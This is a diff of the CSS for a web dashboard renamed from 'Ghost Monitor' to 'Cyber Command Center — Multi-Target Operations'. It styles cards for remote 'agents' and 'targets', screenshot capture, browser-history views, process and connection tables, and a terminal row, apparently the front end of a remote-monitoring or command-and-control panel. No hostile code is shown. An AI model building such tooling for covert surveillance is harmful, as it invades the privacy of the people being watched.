@@ -1,967 +1,800 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="slate">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☠️ GHOST MONITOR — Command Center</title>
+    <title>⚡ CYBER COMMAND CENTER — Multi-Target Operations</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Rajdhani:wght@500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-primary: #0a0a0a;
-            --bg-secondary: #0f0f0f;
-            --bg-card: #111111;
-            --bg-card-hover: #1a1a1a;
-            --border: #1a2f1a;
-            --border-glow: #00ff41;
-            --text-primary: #00ff41;
-            --text-secondary: #00cc33;
-            --text-muted: #0a6e2a;
-            --accent: #00ff41;
-            --accent-glow: #39ff6e;
-            --green: #00ff41;
-            --green-glow: #39ff6e;
-            --red: #ff0040;
-            --orange: #ff6600;
-            --purple: #bf00ff;
-            --cyan: #00ffff;
-            --skull: #ff0040;
-            --radius: 8px;
+            /* CYBER SLATE THEME (Default: High-contrast modern tech slate, NOT pitch black) */
+            --bg-base: #0b1120;
+            --bg-surface: #111a2e;
+            --bg-card: rgba(18, 28, 50, 0.85);
+            --bg-card-hover: rgba(26, 40, 71, 0.95);
+            --border-color: rgba(0, 243, 255, 0.2);
+            --border-glow: #00f3ff;
+            --text-main: #f1f5f9;
+            --text-sub: #94a3b8;
+            --text-dim: #64748b;
+            --cyan: #00f3ff;
+            --neon-green: #00ff88;
+            --neon-purple: #a855f7;
+            --neon-orange: #ff9f1c;
+            --red-alert: #ff2a6d;
+            --hud-blue: #38bdf8;
+            --radius-main: 10px;
             --radius-sm: 6px;
-            --shadow: 0 0 20px rgba(0,255,65,0.1);
-            --font-mono: 'JetBrains Mono', 'Share Tech Mono', 'Menlo', monospace;
             --font-display: 'Orbitron', sans-serif;
+            --font-tech: 'Rajdhani', sans-serif;
+            --font-code: 'JetBrains Mono', monospace;
+            --shadow-glow: 0 0 25px rgba(0, 243, 255, 0.15);
+        }
+
+        [data-theme="light"] {
+            /* CYBER LIGHT / TACTICAL DAY THEME */
+            --bg-base: #f0f4f9;
+            --bg-surface: #ffffff;
+            --bg-card: rgba(255, 255, 255, 0.9);
+            --bg-card-hover: #ffffff;
+            --border-color: rgba(14, 165, 233, 0.3);
+            --border-glow: #0284c7;
+            --text-main: #0f172a;
+            --text-sub: #334155;
+            --text-dim: #64748b;
+            --cyan: #0284c7;
+            --neon-green: #10b981;
+            --neon-purple: #7c3aed;
+            --neon-orange: #f59e0b;
+            --red-alert: #e11d48;
+            --hud-blue: #2563eb;
+            --shadow-glow: 0 4px 20px rgba(2, 132, 199, 0.15);
+        }
+
+        [data-theme="matrix"] {
+            /* MATRIX HACKER GREEN THEME */
+            --bg-base: #050a05;
+            --bg-surface: #0a140a;
+            --bg-card: rgba(10, 25, 10, 0.9);
+            --bg-card-hover: rgba(15, 35, 15, 0.95);
+            --border-color: rgba(0, 255, 102, 0.3);
+            --border-glow: #00ff66;
+            --text-main: #00ff66;
+            --text-sub: #00cc52;
+            --text-dim: #008033;
+            --cyan: #00ff66;
+            --neon-green: #39ff14;
+            --neon-purple: #00e5ff;
+            --neon-orange: #ffcc00;
+            --red-alert: #ff0055;
+            --hud-blue: #00ff66;
+            --shadow-glow: 0 0 25px rgba(0, 255, 102, 0.2);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
-            font-family: var(--font-mono);
-            background: var(--bg-primary);
-            color: var(--text-primary);
+            font-family: var(--font-tech);
+            background: var(--bg-base);
+            color: var(--text-main);
             min-height: 100vh;
             overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(0, 243, 255, 0.05) 0%, transparent 60%),
+                linear-gradient(to right, rgba(255,255,255,0.015) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255,255,255,0.015) 1px, transparent 1px);
+            background-size: 100% 100%, 40px 40px, 40px 40px;
         }
 
-        /* ========== MATRIX RAIN CANVAS ========== */
+        /* Scanlines Overlay */
+        .scanlines {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 1;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%);
+            background-size: 100% 4px;
+            opacity: 0.4;
+        }
+
+        /* Matrix Canvas */
         #matrixCanvas {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            inset: 0;
             z-index: 0;
-            opacity: 0.07;
+            opacity: 0.08;
             pointer-events: none;
         }
 
-        /* ========== SCANLINE OVERLAY ========== */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(0,0,0,0) 0px,
-                rgba(0,0,0,0) 2px,
-                rgba(0,255,65,0.015) 2px,
-                rgba(0,255,65,0.015) 4px
-            );
-            z-index: 1;
-            pointer-events: none;
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.5) 100%);
-            z-index: 1;
-            pointer-events: none;
-        }
-
-        /* ========== GLITCH TEXT ========== */
-        @keyframes glitch {
-            0%, 100% { text-shadow: 2px 0 #ff0040, -2px 0 #00ffff; }
-            25% { text-shadow: -2px 0 #ff0040, 2px 0 #00ffff; }
-            50% { text-shadow: 2px 2px #ff0040, -2px -2px #00ffff; }
-            75% { text-shadow: -2px -1px #ff0040, 2px 1px #00ffff; }
-        }
-
-        @keyframes flicker {
-            0%, 100% { opacity: 1; }
-            92% { opacity: 1; }
-            93% { opacity: 0.8; }
-            94% { opacity: 1; }
-            96% { opacity: 0.6; }
-            97% { opacity: 1; }
-        }
-
-        @keyframes termBlink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-
-        @keyframes skullPulse {
-            0%, 100% { text-shadow: 0 0 10px var(--red), 0 0 20px var(--red); }
-            50% { text-shadow: 0 0 20px var(--red), 0 0 40px var(--red), 0 0 60px var(--red); }
-        }
-
-        /* ========== TOP BAR ========== */
+        /* ========== TOPBAR ========== */
         .topbar {
             position: sticky;
             top: 0;
             z-index: 100;
-            background: rgba(10, 10, 10, 0.95);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid var(--border);
+            background: var(--bg-surface);
+            border-bottom: 1px solid var(--border-color);
             padding: 12px 24px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 12px;
+            gap: 16px;
+            box-shadow: var(--shadow-glow);
+            backdrop-filter: blur(10px);
         }
 
         .brand {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
         }
 
-        .brand-icon {
-            font-size: 1.8rem;
-            color: var(--red);
-            animation: skullPulse 2s ease-in-out infinite;
-        }
-
-        .brand h1 {
-            font-family: var(--font-display);
-            font-size: 1.1rem;
-            font-weight: 800;
-            color: var(--green);
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            animation: glitch 4s ease-in-out infinite, flicker 8s infinite;
-        }
-
-        .brand-sub {
-            font-size: 10px;
-            color: var(--text-muted);
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            margin-top: 2px;
-        }
-
-        .topbar-right {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .stat-pill {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(0,255,65,0.05);
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            padding: 5px 12px;
-            font-size: 12px;
-            font-weight: 600;
-            font-family: var(--font-mono);
-            letter-spacing: 1px;
-        }
-
-        .stat-pill.online { color: var(--green); border-color: rgba(0,255,65,0.3); }
-        .stat-pill.offline { color: var(--red); border-color: rgba(255,0,64,0.3); }
-        .stat-pill.total { color: var(--cyan); border-color: rgba(0,255,255,0.3); }
-        .stat-pill i { font-size: 8px; }
-
-        .last-update {
-            font-size: 10px;
-            color: var(--text-muted);
-            letter-spacing: 1px;
-        }
-
-        .refresh-btn {
-            background: transparent;
-            color: var(--green);
-            border: 1px solid var(--green);
-            padding: 7px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 12px;
-            font-family: var(--font-mono);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            transition: all 0.3s;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-        }
-        .refresh-btn:hover {
-            background: rgba(0,255,65,0.1);
-            box-shadow: 0 0 15px rgba(0,255,65,0.3), inset 0 0 15px rgba(0,255,65,0.1);
-        }
-
-        /* ========== MAIN CONTENT ========== */
-        .main {
-            position: relative;
-            z-index: 2;
-            padding: 24px;
-            max-width: 1700px;
-            margin: 0 auto;
-        }
-
-        /* ========== EMPTY STATE ========== */
-        .empty-state {
-            text-align: center;
-            padding: 80px 40px;
-            animation: fadeIn 0.6s ease;
-        }
-
-        .empty-icon {
-            font-size: 4rem;
-            color: var(--red);
-            margin-bottom: 20px;
-            animation: skullPulse 2s ease-in-out infinite;
-        }
-
-        .empty-state h2 {
-            font-family: var(--font-display);
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin-bottom: 10px;
-            color: var(--green);
-            letter-spacing: 2px;
-            text-transform: uppercase;
-        }
-
-        .empty-state p {
-            color: var(--text-secondary);
-            font-size: 12px;
-            max-width: 500px;
-            margin: 0 auto 20px;
-            line-height: 1.6;
-        }
-
-        .empty-state code {
-            display: inline-block;
-            background: rgba(0,255,65,0.05);
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            padding: 10px 18px;
-            font-family: var(--font-mono);
-            font-size: 12px;
-            color: var(--green);
-        }
-
-        /* ========== AGENTS GRID ========== */
-        .agents-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
-            gap: 16px;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* ========== AGENT CARD ========== */
-        .agent-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            overflow: hidden;
-            cursor: pointer;
-            transition: all 0.3s;
-            position: relative;
-        }
-
-        .agent-card:hover {
-            border-color: var(--green);
-            box-shadow: 0 0 30px rgba(0,255,65,0.15), inset 0 0 30px rgba(0,255,65,0.02);
-        }
-
-        .agent-card.online::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--green), transparent);
-            animation: scanLine 2s linear infinite;
-        }
-
-        @keyframes scanLine {
-            0% { opacity: 0.3; }
-            50% { opacity: 1; }
-            100% { opacity: 0.3; }
-        }
-
-        .agent-card.offline::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 2px;
-            background: var(--red);
-            opacity: 0.5;
-        }
-
-        .card-top {
-            padding: 16px 18px 12px;
-            display: flex;
-            align-items: flex-start;
-            justify-content: space-between;
-            gap: 12px;
-        }
-
-        .card-user {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex: 1;
-            min-width: 0;
-        }
-
-        .card-avatar {
-            width: 44px;
-            height: 44px;
+        .cyber-logo {
+            width: 42px; height: 42px;
+            background: linear-gradient(135deg, var(--cyan), var(--neon-purple));
             border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.2rem;
-            flex-shrink: 0;
-            position: relative;
+            color: #000;
+            font-size: 1.3rem;
+            box-shadow: 0 0 15px var(--cyan);
+            clip-path: polygon(0 0, 100% 0, 100% 80%, 80% 100%, 0 100%);
         }
 
-        .card-avatar.online {
-            background: rgba(0,255,65,0.08);
-            color: var(--green);
-            border: 1px solid rgba(0,255,65,0.3);
-        }
-
-        .card-avatar.offline {
-            background: rgba(255,0,64,0.08);
-            color: var(--red);
-            border: 1px solid rgba(255,0,64,0.2);
-        }
-
-        .card-avatar .live-dot {
-            position: absolute;
-            bottom: -2px; right: -2px;
-            width: 12px; height: 12px;
-            border-radius: 50%;
-            border: 2px solid var(--bg-card);
-        }
-
-        .card-avatar .live-dot.online {
-            background: var(--green);
-            box-shadow: 0 0 8px var(--green);
-            animation: blink 1.5s ease-in-out infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .card-avatar .live-dot.offline { background: var(--red); }
-
-        .card-hostname {
-            font-family: var(--font-display);
-            font-size: 0.85rem;
-            font-weight: 700;
-            color: var(--green);
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            margin-bottom: 2px;
-            letter-spacing: 1px;
-        }
-
-        .card-ip {
-            font-size: 11px;
-            color: var(--text-muted);
-            font-family: var(--font-mono);
-        }
-
-        .card-status-badge {
-            font-family: var(--font-mono);
-            font-size: 10px;
-            font-weight: 700;
-            padding: 3px 10px;
-            border-radius: 3px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            flex-shrink: 0;
-        }
-
-        .card-status-badge.online {
-            background: rgba(0,255,65,0.1);
-            color: var(--green);
-            border: 1px solid rgba(0,255,65,0.3);
-            box-shadow: 0 0 10px rgba(0,255,65,0.1);
-        }
-
-        .card-status-badge.offline {
-            background: rgba(255,0,64,0.1);
-            color: var(--red);
-            border: 1px solid rgba(255,0,64,0.2);
-        }
-
-        .card-stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1px;
-            background: var(--border);
-            border-top: 1px solid var(--border);
-        }
-
-        .card-stat {
-            background: var(--bg-card);
-            padding: 12px 14px;
-            text-align: center;
-        }
-
-        .card-stat-label {
-            font-size: 9px;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-bottom: 4px;
-            font-weight: 600;
-        }
-
-        .card-stat-value {
+        .brand-text h1 {
             font-family: var(--font-display);
             font-size: 1.1rem;
             font-weight: 800;
-            letter-spacing: -0.5px;
-        }
-
-        .card-stat-value.cpu { color: var(--cyan); }
-        .card-stat-value.mem { color: var(--purple); }
-        .card-stat-value.disk { color: var(--orange); }
-
-        .card-stat-bar {
-            height: 2px;
-            background: rgba(255,255,255,0.05);
-            border-radius: 1px;
-            margin-top: 6px;
-            overflow: hidden;
-        }
-
-        .card-stat-bar-fill {
-            height: 100%;
-            border-radius: 1px;
-            transition: width 0.6s;
-        }
-
-        .card-stat-bar-fill.cpu { background: var(--cyan); box-shadow: 0 0 6px var(--cyan); }
-        .card-stat-bar-fill.mem { background: var(--purple); box-shadow: 0 0 6px var(--purple); }
-        .card-stat-bar-fill.disk { background: var(--orange); box-shadow: 0 0 6px var(--orange); }
-
-        .card-footer {
-            padding: 10px 18px;
+            letter-spacing: 2px;
+            color: var(--text-main);
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            font-size: 10px;
-            color: var(--text-muted);
-            border-top: 1px solid var(--border);
-            letter-spacing: 0.5px;
+            gap: 8px;
         }
 
-        .card-footer i { margin-right: 4px; }
-        .card-footer .view-btn {
-            color: var(--green);
+        .brand-text h1 span {
+            color: var(--cyan);
+            text-shadow: 0 0 10px var(--cyan);
+        }
+
+        .brand-tag {
+            font-size: 11px;
+            color: var(--text-sub);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-family: var(--font-code);
+        }
+
+        .topbar-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .hud-pill {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
             font-weight: 600;
+            font-family: var(--font-code);
+        }
+        .hud-pill.online { color: var(--neon-green); border-color: rgba(0,255,136,0.3); }
+        .hud-pill.offline { color: var(--red-alert); border-color: rgba(255,42,109,0.3); }
+        .hud-pill.total { color: var(--cyan); }
+
+        .theme-switcher {
+            display: flex;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 3px;
+            gap: 2px;
+        }
+
+        .theme-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-sub);
+            padding: 4px 10px;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: 700;
+            font-family: var(--font-code);
+            transition: all 0.2s;
             display: flex;
             align-items: center;
             gap: 4px;
+        }
+
+        .theme-btn.active {
+            background: var(--cyan);
+            color: #000;
+            box-shadow: 0 0 10px var(--cyan);
+        }
+
+        .action-btn {
+            background: linear-gradient(135deg, var(--cyan), var(--hud-blue));
+            color: #000;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 6px;
+            font-family: var(--font-display);
+            font-size: 11px;
+            font-weight: 800;
+            cursor: pointer;
             letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.3s;
             text-transform: uppercase;
-            font-size: 10px;
         }
 
-        .agent-card:hover .view-btn { text-shadow: 0 0 10px var(--green); }
-
-        /* ========== DETAIL MODAL ========== */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(5px);
-            z-index: 1000;
-            display: none;
-            align-items: flex-start;
-            justify-content: center;
-            padding: 30px 16px;
-            overflow-y: auto;
-            animation: fadeOverlay 0.2s ease;
+        .action-btn:hover {
+            box-shadow: 0 0 20px var(--cyan);
+            transform: translateY(-1px);
         }
 
-        .modal-overlay.active { display: flex; }
-        @keyframes fadeOverlay { from { opacity: 0; } to { opacity: 1; } }
+        /* ========== MAIN CONTAINER ========== */
+        .main-container {
+            position: relative;
+            z-index: 2;
+            padding: 24px;
+            max-width: 1750px;
+            margin: 0 auto;
+        }
 
-        .modal {
-            background: var(--bg-primary);
-            border: 1px solid var(--border);
-            border-radius: 10px;
+        /* Controls Bar */
+        .controls-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+
+        .search-box {
+            position: relative;
+            flex: 1;
+            max-width: 420px;
+        }
+
+        .search-box i {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--cyan);
+        }
+
+        .search-box input {
             width: 100%;
-            max-width: 1200px;
-            box-shadow: 0 0 60px rgba(0,255,65,0.1);
-            animation: slideUp 0.3s ease;
+            padding: 10px 14px 10px 40px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            color: var(--text-main);
+            font-family: var(--font-code);
+            font-size: 13px;
+            transition: all 0.3s;
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: var(--cyan);
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
+        }
+
+        .filter-tabs {
+            display: flex;
+            gap: 8px;
+        }
+
+        .tab-btn {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            color: var(--text-sub);
+            padding: 8px 16px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            font-family: var(--font-tech);
+            font-weight: 700;
+            font-size: 13px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tab-btn.active {
+            background: rgba(0, 243, 255, 0.15);
+            border-color: var(--cyan);
+            color: var(--cyan);
+        }
+
+        /* GRID LAYOUT */
+        .agents-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+            gap: 20px;
+        }
+
+        /* CARD AGENT */
+        .agent-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-main);
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+
+        .agent-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: linear-gradient(90deg, transparent, var(--cyan), transparent);
+            border-radius: 10px 10px 0 0;
+            opacity: 0.6;
+        }
+
+        .agent-card.online::before {
+            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
+        }
+
+        .agent-card.offline::before {
+            background: linear-gradient(90deg, transparent, var(--red-alert), transparent);
+        }
+
+        .agent-card:hover {
+            transform: translateY(-3px);
+            border-color: var(--cyan);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+
+        .target-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .target-icon {
+            width: 44px; height: 44px;
+            border-radius: 10px;
+            background: rgba(0, 243, 255, 0.08);
+            border: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            color: var(--cyan);
             position: relative;
         }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        .target-icon.online { color: var(--neon-green); border-color: rgba(0, 255, 136, 0.4); background: rgba(0, 255, 136, 0.08); }
+        .target-icon.offline { color: var(--red-alert); border-color: rgba(255, 42, 109, 0.4); background: rgba(255, 42, 109, 0.08); }
 
-        .modal-header {
-            padding: 18px 24px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
+        .live-dot {
+            position: absolute;
+            top: -2px; right: -2px;
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            background: var(--neon-green);
+            box-shadow: 0 0 8px var(--neon-green);
+            animation: pulseDot 1.5s infinite;
         }
+        .live-dot.offline { background: var(--red-alert); box-shadow: none; animation: none; }
 
-        .modal-header-left {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
+        @keyframes pulseDot { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        .modal-avatar {
-            width: 48px; height: 48px;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.3rem;
-        }
-
-        .modal-avatar.online {
-            background: rgba(0,255,65,0.1);
-            color: var(--green);
-        }
-
-        .modal-avatar.offline {
-            background: rgba(255,0,64,0.1);
-            color: var(--red);
-        }
-
-        .modal-title {
+        .target-name {
             font-family: var(--font-display);
-            font-size: 1.1rem;
+            font-size: 15px;
             font-weight: 700;
-            color: var(--green);
-            letter-spacing: 2px;
-        }
-        .modal-subtitle {
-            font-size: 11px;
-            color: var(--text-muted);
-            margin-top: 2px;
-            letter-spacing: 0.5px;
+            color: var(--text-main);
+            margin-bottom: 2px;
         }
 
-        .modal-close {
-            width: 36px; height: 36px;
-            border-radius: 6px;
-            border: 1px solid var(--border);
-            background: transparent;
-            color: var(--text-muted);
-            font-size: 1rem;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s;
-        }
-        .modal-close:hover { background: var(--red); color: white; border-color: var(--red); }
-
-        .modal-stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 10px;
-            padding: 16px 24px;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .m-stat {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-sm);
-            padding: 12px 14px;
-        }
-
-        .m-stat-label {
-            font-size: 9px;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-bottom: 4px;
-            font-weight: 600;
-        }
-
-        .m-stat-value {
-            font-family: var(--font-display);
-            font-size: 1.2rem;
-            font-weight: 800;
-        }
-
-        .m-stat-sub { font-size: 10px; color: var(--text-muted); margin-top: 3px; }
-        .m-stat-bar { height: 3px; background: rgba(255,255,255,0.05); border-radius: 2px; margin-top: 6px; overflow: hidden; }
-        .m-stat-bar-fill { height: 100%; border-radius: 2px; transition: width 0.6s; }
-
-        .modal-body { padding: 16px 24px 24px; }
-
-        .modal-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 14px;
-        }
-
-        .m-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-sm);
-            overflow: hidden;
-        }
-
-        .m-card-header {
-            padding: 10px 16px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .m-card-header h3 {
-            font-family: var(--font-mono);
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            color: var(--text-secondary);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-weight: 600;
-        }
-
-        .m-card-header h3 i { color: var(--green); font-size: 12px; }
-
-        .m-card-body {
-            padding: 12px 16px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-
-        .m-card-body::-webkit-scrollbar { width: 3px; }
-        .m-card-body::-webkit-scrollbar-track { background: transparent; }
-        .m-card-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
-
-        .full-span { grid-column: 1 / -1; }
-
-        /* Screenshot */
-        .screenshot {
-            width: 100%;
-            border-radius: 6px;
-            border: 1px solid var(--border);
-            display: block;
-            background: var(--bg-primary);
-        }
-
-        .ss-placeholder {
-            text-align: center;
-            padding: 40px 16px;
-            color: var(--text-muted);
-            font-size: 11px;
-        }
-        .ss-placeholder i { font-size: 2rem; margin-bottom: 10px; display: block; opacity: 0.4; }
-
-        /* Screenshot Controls */
-        .ss-controls {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-        }
-
-        .ss-btn {
-            background: transparent;
-            border: 1px solid var(--border);
-            color: var(--text-secondary);
-            padding: 5px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-family: var(--font-mono);
-            font-size: 10px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            transition: all 0.2s;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .ss-btn:hover { border-color: var(--green); color: var(--green); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
-        .ss-btn.active { background: rgba(0,255,65,0.1); border-color: var(--green); color: var(--green); }
-        .ss-btn.download-btn:hover { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 10px rgba(0,255,255,0.2); }
-        .ss-btn.danger { border-color: rgba(255,0,64,0.3); }
-        .ss-btn.danger:hover { border-color: var(--red); color: var(--red); box-shadow: 0 0 10px rgba(255,0,64,0.2); }
-
-        /* History list */
-        .h-list { list-style: none; }
-        .h-list li {
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(0,255,65,0.03);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 11px;
-            color: var(--text-secondary);
-        }
-        .h-list li:last-child { border: none; }
-
-        .h-badge {
-            padding: 1px 6px;
-            border-radius: 3px;
-            font-size: 9px;
-            font-weight: 600;
-            flex-shrink: 0;
-            letter-spacing: 0.5px;
-        }
-        .h-badge.safari { background: rgba(0,255,255,0.1); color: var(--cyan); }
-        .h-badge.chrome { background: rgba(0,255,65,0.1); color: var(--green); }
-        .h-badge.firefox { background: rgba(255,102,0,0.1); color: var(--orange); }
-
-        .h-title { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-
-        /* Process table */
-        .p-table { width: 100%; border-collapse: collapse; font-size: 10px; }
-        .p-table th {
-            text-align: left; padding: 5px 6px;
-            color: var(--text-muted); font-weight: 600;
-            font-size: 9px; text-transform: uppercase; letter-spacing: 1px;
-            border-bottom: 1px solid var(--border);
-        }
-        .p-table td {
-            padding: 4px 6px;
-            border-bottom: 1px solid rgba(0,255,65,0.02);
-            color: var(--text-secondary);
-        }
-        .p-table tr:hover td { background: rgba(0,255,65,0.03); }
-        .cpu-hi { color: var(--red); font-weight: 600; }
-        .cpu-md { color: var(--orange); }
-        .cpu-lo { color: var(--text-muted); }
-
-        /* Files */
-        .f-item {
-            padding: 3px 0;
-            border-bottom: 1px solid rgba(0,255,65,0.02);
-            font-size: 10px;
-            color: var(--text-muted);
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .f-item:hover { color: var(--green); }
-
-        /* Connection table */
-        .c-table { width: 100%; border-collapse: collapse; font-size: 10px; }
-        .c-table th {
-            text-align: left; padding: 5px 6px;
-            color: var(--text-muted); font-weight: 600;
-            font-size: 9px; text-transform: uppercase;
-            border-bottom: 1px solid var(--border);
-        }
-        .c-table td {
-            padding: 3px 6px;
-            border-bottom: 1px solid rgba(0,255,65,0.02);
-            color: var(--text-secondary);
-        }
-
-        /* Apps chips */
-        .app-chip {
-            display: inline-block;
-            background: rgba(0,255,65,0.03);
-            border: 1px solid rgba(0,255,65,0.08);
-            padding: 3px 10px;
-            border-radius: 3px;
-            font-size: 10px;
-            margin: 2px;
-            color: var(--text-secondary);
-            transition: all 0.2s;
-        }
-        .app-chip:hover { background: rgba(0,255,65,0.1); color: var(--green); border-color: rgba(0,255,65,0.3); }
-
-        /* Active window */
-        .active-win-text {
-            font-family: var(--font-display);
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: var(--green);
-            text-shadow: 0 0 20px rgba(0,255,65,0.3);
-            padding: 4px 0;
-        }
-
-        /* Terminal */
-        .terminal-box { }
-        .cmd-row { display: flex; gap: 6px; }
